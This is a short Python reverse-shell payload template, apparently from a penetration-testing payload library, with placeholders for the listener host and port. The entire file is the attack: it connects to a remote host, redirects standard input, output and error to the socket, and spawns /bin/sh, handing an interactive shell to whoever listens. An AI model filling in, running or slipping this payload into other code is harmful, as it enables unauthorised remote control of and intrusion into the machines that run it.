import os
import pty
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('§LHOST§', §LPORT§))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn('/bin/sh')
